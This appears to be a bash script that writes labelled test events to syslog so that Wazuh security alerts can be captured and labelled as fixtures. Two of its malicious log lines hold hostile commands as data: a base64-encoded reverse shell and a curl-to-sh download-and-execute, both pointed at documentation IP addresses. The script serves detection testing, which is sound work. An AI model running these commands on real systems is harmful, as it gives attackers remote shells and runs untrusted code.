#!/usr/bin/env bash
# Generate labelled test events on a Linux machine with a Wazuh agent.
#
# Safe by design: attack lines are written to syslog with `logger` (nothing is executed),
# and the only file change is a comment-only file in /etc/sudoers.d (remove it afterwards).
# Run with sudo on a test machine, never on production:
#   sudo bash generate_events.sh
#
# Each event carries a unique marker (RFTEST-<run>-<n>) so you can find the resulting alerts and
# label them: capture with capture_alerts.py --query 'full_log:"<run id>"'.
set -euo pipefail

RUN="RFTEST-$(date +%s)"
echo "Run id: $RUN"

log_auth() {  # $1 = program tag, $2 = message
  logger -p authpriv.notice -t "$1" "$2"
}

echo "[benign]    routine admin sudo"
log_auth sudo "sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/systemctl restart cron # $RUN-1"

echo "[benign]    single failed SSH login"
log_auth "sshd[4242]" "Failed password for invalid user test from 198.51.100.8 port 40022 ssh2 # $RUN-2"

echo "[malicious] web account runs a base64-decoded shell via sudo (log line only)"
log_auth sudo "www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMC4yLjEvNDQ0NCAwPiYx | base64 -d | bash # $RUN-3"

echo "[malicious] download-and-execute via sudo (log line only)"
log_auth sudo "www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c curl -s http://192.0.2.10/x.sh | sh # $RUN-4"

echo "[malicious] sudoers.d change (comment-only file, removed after the FIM scan window)"
if [ -d /etc/sudoers.d ]; then
  echo "# $RUN-5 red flags test file, safe to delete" > /etc/sudoers.d/zz-redflags-test
  chmod 0440 /etc/sudoers.d/zz-redflags-test
  echo "  Created /etc/sudoers.d/zz-redflags-test."
  echo "  Wazuh FIM only reports it if /etc is monitored in realtime, or after the next scheduled scan."
  echo "  Remove it afterwards: sudo rm /etc/sudoers.d/zz-redflags-test"
fi

echo
echo "Done. Alerts appear in the indexer within a minute (FIM: after the next scan)."
echo "Capture them, e.g.:"
echo "  python3 capture_alerts.py --url https://localhost:9200 --user admin --insecure --since 30 \\"
echo "      --query 'full_log:\"$RUN\"' --out fixtures/$RUN.ndjson --labels fixtures/$RUN.csv"
echo "Notes per event: -1 benign, -2 benign, -3 malicious, -4 malicious, -5 malicious"
